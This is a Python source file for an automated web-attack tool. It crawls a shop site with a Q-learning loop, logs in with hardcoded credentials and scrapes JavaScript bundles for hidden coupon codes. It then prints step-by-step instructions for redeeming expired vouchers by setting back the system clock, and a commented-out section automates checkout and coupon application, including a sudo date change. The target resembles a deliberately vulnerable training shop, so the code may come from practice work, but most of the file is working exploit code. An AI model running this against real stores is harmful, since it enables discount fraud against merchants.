import json
import time
import random
import re
import requests
import subprocess
import os
import numpy as np
from datetime import datetime
from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup

class MLWorkflowExecutor:
    def __init__(self, base_url, directories_file, business_logic_file, workflow_file, q_table_file):
        self.base_url = base_url.rstrip("/")
        self.directories_file = directories_file
        self.business_logic_file = business_logic_file
        self.workflow_file = workflow_file
        self.q_table_file = q_table_file

        self.visited_urls = set()
        self.api_requests = []
        self.logged_in = False
        self.product_added = False
        self.checkout_failed = False

        # Q-learning parameters
        self.q_table = self.load_q_table()
        self.epsilon = 0.1   # Explores 10% of the time
        self.alpha = 0.3     # Learning rate
        self.gamma = 0.9     # Discount factor

        # Keep track of discovered coupon codes (populated by discover_coupon_codes())
        # For example: {"WMNSDY2019": {"validOn": 1551999600000.0, "discount": 75}, ...}
        self.coupon_codes = {}

    # ----------------------------------------------------------------------
    # JSON / Q-table helpers
    # ----------------------------------------------------------------------
    def save_json(self, filename, data):
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
        print(f"[+] Data saved to {filename}")

    def load_json(self, filename):
        try:
            with open(filename, "r") as f:
                return json.load(f)
        except FileNotFoundError:
            return {"urls": [], "api_endpoints": [], "interactions": {}}

    def load_q_table(self):
        try:
            with open(self.q_table_file, "r") as f:
                data = json.load(f)
                if not isinstance(data, dict):
                    raise ValueError("Q-table is not in dictionary format.")
                return data
        except (FileNotFoundError, json.JSONDecodeError, ValueError) as e:
            print(f"[!] Warning: Q-table file is invalid or missing. Resetting... {e}")
            return {}

    def save_q_table(self):
        self.save_json(self.q_table_file, self.q_table)

    # ----------------------------------------------------------------------
    # Q-learning logic
    # ----------------------------------------------------------------------
    def get_state(self):
        """
        Represent the state as a string for Q-learning, including visited URLs
        and whether we've added a product to the cart.
        """
        return "_".join(sorted(self.visited_urls)) + f"_productAdded={self.product_added}"

    def update_q_table(self, state, action, reward, next_state):
        """
        Q(s, a) ← Q(s, a) + α [ r + γ * max(Q(s'), •) - Q(s, a) ].
        """
        if state not in self.q_table:
            known_urls = self.load_json(self.directories_file)["urls"]
            self.q_table[state] = {url: 0 for url in known_urls}

        old_value = self.q_table[state].get(action, 0)
        next_max = max(self.q_table.get(next_state, {}).values(), default=0)
        new_value = old_value + self.alpha * (reward + self.gamma * next_max - old_value)
        self.q_table[state][action] = new_value
        self.save_q_table()

    def select_next_action(self, state):
        """
        Pick the next page to visit. 
         - Prioritize a product page if we haven't added a product yet,
         - Then basket, then checkout.
        """
        site_data = self.load_json(self.directories_file)
        possible_actions = [url for url in site_data["urls"] if url not in self.visited_urls]

        if not possible_actions:
            return None

        preferred_actions = sorted(
            possible_actions,
            key=lambda x: (
                "product" in x and not self.product_added,
                "basket" in x,
                "checkout" in x
            ),
            reverse=True
        )

        if random.uniform(0, 1) < self.epsilon:
            return random.choice(possible_actions)
        return preferred_actions[0]

    # ----------------------------------------------------------------------
    # Core workflow steps
    # ----------------------------------------------------------------------
    def execute_workflow(self, page):
        """
        Main loop: 
         1. Pick next action via Q-learning.
         2. Navigate to the page.
         3. Trigger login/product actions.
         4. Update Q-table.
        """
        while True:
            state = self.get_state()
            action = self.select_next_action(state)
            if not action:
                print("[+] No more unvisited URLs, stopping workflow.")
                break

            print(f"[+] ML decided next action: Visiting {action}")
            page.goto(action, wait_until="domcontentloaded")
            time.sleep(2)
            self.visited_urls.add(action)

            if "login" in action and not self.logged_in:
                self.perform_login(page)
            if "product" in action:
                self.add_product_to_cart(page)

            if "checkout" in action:
                reward = 50
            elif "basket" in action:
                reward = 30
            elif "product" in action:
                reward = 10
            else:
                reward = 1

            next_state = self.get_state()
            self.update_q_table(state, action, reward, next_state)

        # self.execute_checkout(page) #COUPON EXPLOIT
        # self.exploit_expired_coupon(page)

    def perform_login(self, page):
        print("[+] Attempting login...")
        page.goto(f"{self.base_url}/#/login", wait_until="domcontentloaded")
        time.sleep(2)
        page.fill('input[name="email"]', "user@example.com")
        page.fill('input[name="password"]', "password123")
        page.click('button[type="submit"]')
        time.sleep(3)
        page.goto(f"{self.base_url}/rest/user/whoami", wait_until="domcontentloaded")
        if "email" in page.content():
            print("[+] Login successful!")
            self.logged_in = True

    def add_product_to_cart(self, page):
        try:
            print("[+] Attempting to add product to cart...")
            add_buttons = page.locator('button[aria-label="Add to Basket"]')
            if add_buttons.count() > 0:
                add_buttons.first.click()
                time.sleep(2)
                print("[+] Product added to cart!")
                self.product_added = True
            else:
                print("[!] No 'Add to Basket' button found on this page.")
        except Exception as e:
            print(f"[!] Could not add product: {e}")

    

    def discover_coupon_codes(self):
        try:
            resp = requests.get(self.base_url, timeout=10)
            if resp.status_code != 200:
                print(f"[!] Could not retrieve base page: HTTP {resp.status_code}")
                return
            scripts = re.findall(r'<script.*?src="([^"]+)".*?>', resp.text)
            if not scripts:
                print("[!] No <script> tags found on base page.")
                return
            found_campaigns = False
            for script_url in scripts:
                if not script_url.endswith(".js"):
                    continue
                if script_url.startswith("/"):
                    script_url = self.base_url + script_url
                elif not script_url.startswith("http"):
                    script_url = f"{self.base_url}/{script_url}"
                if self.parse_campaigns_in_js(script_url):
                    found_campaigns = True
                    break
            if found_campaigns:
                print(f"[+] Discovered coupon codes: {self.coupon_codes}")
            else:
                print("[!] No 'this.campaigns' object found in any JS file.")
        except requests.RequestException as e:
            print(f"[!] Error connecting to {self.base_url}: {e}")

    def parse_campaigns_in_js(self, js_url):
        """
        Parses the JS file to find multiple coupon definitions using re.search in a loop.
        The pattern expects coupon definitions in the form:
        CODE: { validOn: 1551999600000, discount: 75 }
        Optionally, the code may be quoted. Each entry is expected to be separated by a comma.
        """
        try:
            response = requests.get(js_url, timeout=10)
            if response.status_code != 200:
                return False

            text = response.text
            # This regex allows for optional quotes around the coupon code,
            # and matches a structure like:
            # "WMNSDY2019": { validOn: 1551999600000, discount: 75 }
            pattern = r'["\']?([A-Z0-9_]+)["\']?\s*:\s*\{\s*validOn\s*:\s*([\d.eE]+)\s*,\s*discount\s*:\s*(\d+)\s*\}'
            found_any = False

            # Loop repeatedly using re.search and slice the text after each match.
            while True:
                match = re.search(pattern, text, re.DOTALL | re.IGNORECASE)
                if not match:
                    break  # No more matches

                coupon_code = match.group(1)
                valid_on_str = match.group(2)
                discount_str = match.group(3)

                try:
                    valid_on = float(valid_on_str)
                    discount = int(discount_str)
                    # Store this coupon. (If duplicate coupon_code appears later, it will be overwritten.)
                    self.coupon_codes[coupon_code] = {"validOn": valid_on, "discount": discount}
                    found_any = True
                except ValueError:
                    # Skip this match if conversion fails.
                    pass

                # Slice off the matched part so that the next iteration won't re-match it.
                text = text[match.end():]

            return found_any

        except requests.RequestException:
            return False
        
    def print_exploitation_steps(self, page):
        if not self.coupon_codes:
            print("[!] No coupon codes discovered.")
            return
        print("\n[+] --- Manual Exploitation Steps for Expired Vouchers ---")
        now = datetime.now()
        for coupon_code, data in self.coupon_codes.items():
            voucher_date = datetime.fromtimestamp(data['validOn'] / 1000)
            if voucher_date < now:
                steps = (
                    f"Voucher: {coupon_code}\n"
                    f"  Discount: {data['discount']}%\n"
                    f"  Valid On: {voucher_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                    "Steps to exploit this expired voucher:\n"
                    "  1. Change your system date/time to the voucher's valid date above.\n"
                    "  2. Navigate to the Payment page and expand the coupon section.\n"
                    f"  3. Enter voucher code '{coupon_code}' and click 'Apply Coupon'.\n"
                    "  4. Verify that the coupon is accepted and the discount is applied.\n"
                )
                print(steps)
                current_state = self.get_state()
                self.update_q_table(current_state, "coupon_scan_and_report", 100, current_state)
            else:
                print(f"[+] Voucher {coupon_code} is not expired (valid on {voucher_date.strftime('%Y-%m-%d %H:%M:%S')}).")
        print("[+] --- End of Exploitation Steps ---\n")

# def execute_checkout(self, page):
    #     try:
    #         basket_url = f"{self.base_url}/#/basket"
    #         print(f"[+] Navigating to Basket: {basket_url}")
    #         page.goto(basket_url, wait_until="domcontentloaded")
    #         time.sleep(2)
    #         page.evaluate("document.querySelectorAll('.cdk-overlay-backdrop').forEach(e => e.remove());")
    #         time.sleep(0.5)
    #         checkout_button = page.locator('#checkoutButton')
    #         if checkout_button.count() == 0:
    #             print("[!] #checkoutButton not found; trying alternative selector...")
    #             checkout_button = page.locator('.checkout-button')
    #         if checkout_button.count() > 0 and checkout_button.is_visible():
    #             print("[+] Checkout button found. Clicking now...")
    #             checkout_button.click(force=True)
    #             time.sleep(2)
    #         else:
    #             print("[!] Checkout button is not clickable or not found.")
    #             return

    #         address_url = f"{self.base_url}/#/address/select"
    #         print(f"[+] Expecting address selection page: {address_url}")
    #         page.goto(address_url, wait_until="domcontentloaded")
    #         time.sleep(2)
    #         address_radio = page.locator("mat-radio-button")
    #         if address_radio.count() > 0:
    #             print("[+] Selecting an address radio button...")
    #             address_radio.first.click(force=True)
    #             time.sleep(1)
    #         else:
    #             print("[!] No address radio button found.")
    #             return

    #         next_button = page.locator('button:has-text("Next")')
    #         if next_button.count() > 0:
    #             next_button.click(force=True)
    #             time.sleep(2)
    #         else:
    #             print("[!] Could not find Next button on address page.")

    #         delivery_url = f"{self.base_url}/#/delivery-method"
    #         print(f"[+] Expecting delivery method page: {delivery_url}")
    #         page.goto(delivery_url, wait_until="domcontentloaded")
    #         time.sleep(2)
    #         delivery_radio = page.locator("mat-radio-button")
    #         if delivery_radio.count() > 0:
    #             print("[+] Selecting a delivery method radio button...")
    #             delivery_radio.first.click(force=True)
    #             time.sleep(1)
    #         else:
    #             print("[!] No delivery method radio button found.")
    #             return

    #         next_button = page.locator('button:has-text("Next")')
    #         if next_button.count() > 0:
    #             next_button.click(force=True)
    #             time.sleep(2)
    #         else:
    #             print("[!] Could not find Next button on delivery method page.")

    #         payment_url = f"{self.base_url}/#/payment/shop"
    #         print(f"[+] Navigating to Payment page: {payment_url}")
    #         page.goto(payment_url, wait_until="domcontentloaded")
    #         time.sleep(2)
    #         expand_button = page.locator('button[aria-label*="Coupon"]')
    #         if expand_button.count() > 0:
    #             print("[+] Clicking expansion indicator to reveal coupon form...")
    #             expand_button.click(force=True)
    #             time.sleep(1)
    #         else:
    #             print("[!] Expansion indicator for coupon form not found.")
    #         print("[+] Checkout flow completed up to coupon input form.")
    #     except Exception as e:
    #         print(f"[!] Checkout failed: {e}")

    # def wait_for_coupon_input(self, page, timeout=10000):
    #     try:
    #         page.wait_for_selector('input#coupon', timeout=timeout)
    #         print("[+] Found coupon input using ID: 'coupon'")
    #         return page.locator('input#coupon')
    #     except Exception as e:
    #         print(f"[!] Input with id 'coupon' not found: {e}")
    #     try:
    #         selector = 'mat-expansion-panel#collapseCouponElement input[type="text"]'
    #         page.wait_for_selector(selector, timeout=timeout)
    #         print(f"[+] Found coupon input using selector: {selector}")
    #         return page.locator(selector)
    #     except Exception as e:
    #         print(f"[!] Input text within coupon panel not found: {e}")
    #     raise Exception("Coupon input field not found using any method.")

    # def expand_coupon_section(self, page):
    #     try:
    #         coupon_expander = page.locator('mat-expansion-panel#collapseCouponElement mat-expansion-panel-header')
    #         if coupon_expander.count() > 0:
    #             print("[+] Found coupon expansion panel header. Clicking to expand...")
    #             coupon_expander.first.click(force=True)
    #             time.sleep(1)
    #         else:
    #             print("[!] Could not find the coupon panel header 'collapseCouponElement'.")
    #     except Exception as e:
    #         print(f"[!] Error expanding coupon panel: {e}")

    # def set_system_date(self, new_timestamp):
    #     dt = datetime.fromtimestamp(new_timestamp / 1000)
    #     date_str = dt.strftime("%Y-%m-%d %H:%M:%S")
    #     print(f"[+] Setting system date/time to: {date_str}")
    #     try:
    #         if os.name == 'posix':
    #             subprocess.run(["sudo", "date", "-s", date_str], check=True)
    #         elif os.name == 'nt':
    #             # On Windows, switch format to day-month-year
    #             date_part = dt.strftime("%d-%m-%Y")
    #             time_part = dt.strftime("%H:%M:%S")
    #             subprocess.run(["date", date_part], shell=True, check=True)
    #             subprocess.run(["time", time_part], shell=True, check=True)
    #         else:
    #             print("[!] Unsupported OS for changing system date.")
    #     except Exception as e:
    #         print(f"[!] Failed to set system date/time: {e}")

    # def exploit_expired_coupon(self, page):
    #     if not self.coupon_codes:
    #         print("[!] No coupon codes found; skipping coupon exploit.")
    #         return

    #     payment_url = f"{self.base_url}/#/payment/shop"
    #     print(f"[+] Navigating to Payment page for coupon exploitation: {payment_url}")
    #     page.goto(payment_url, wait_until="domcontentloaded")
    #     time.sleep(2)

    #     self.expand_coupon_section(page)

    #     payment_option_radio = page.locator("mat-radio-button")
    #     if payment_option_radio.count() > 0:
    #         print("[+] Selecting the payment option radio button...")
    #         payment_option_radio.first.click(force=True)
    #         time.sleep(1)
    #     else:
    #         print("[!] Payment option radio button not found; proceeding without selection.")

    #     try:
    #         coupon_input = self.wait_for_coupon_input(page, timeout=10000)
    #     except Exception as e:
    #         print(f"[!] Coupon input field not found: {e}")
    #         return

    #     for coupon_code, data in self.coupon_codes.items():
    #         try:
    #             print(f"\n[+] Attempting coupon code: {coupon_code} (validOn={data['validOn']}, discount={data['discount']})")
    #             # Change the system date/time first before applying the coupon
    #             self.set_system_date(1551999600000)
    #             time.sleep(2)
    #             coupon_input.fill("")
    #             coupon_input.fill(coupon_code)
    #             page.click('button[id="applyCouponButton"]')
    #             time.sleep(2)
    #             try:
    #                 page.wait_for_selector('.error[role="alert"]', timeout=3000)
    #                 error_text = page.locator('.error[role="alert"]').inner_text()
    #                 if "Invalid Coupon" in error_text:
    #                     print(f"[!] Coupon {coupon_code} is still invalid after system date change.")
    #                 else:
    #                     print(f"[+] Coupon {coupon_code} was accepted after system date change.")
    #             except Exception:
    #                 print(f"[+] Possibly accepted coupon {coupon_code} on first try after system date change.")
    #         except Exception as e:
    #             print(f"[!] Failed to apply coupon {coupon_code}: {e}")


    def run(self):
        self.discover_coupon_codes()
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False)
            page = browser.new_page()
            page.goto(self.base_url, wait_until="domcontentloaded")
            time.sleep(2)
            self.execute_workflow(page)
            self.print_exploitation_steps(page)
            browser.close()

if __name__ == "__main__":
    automator = MLWorkflowExecutor(
        base_url="https://slaying.ddns.net",
        directories_file="directories.json",
        business_logic_file="available.json",
        workflow_file="workflow.json",
        q_table_file="q_table.json"
    )
    automator.run()
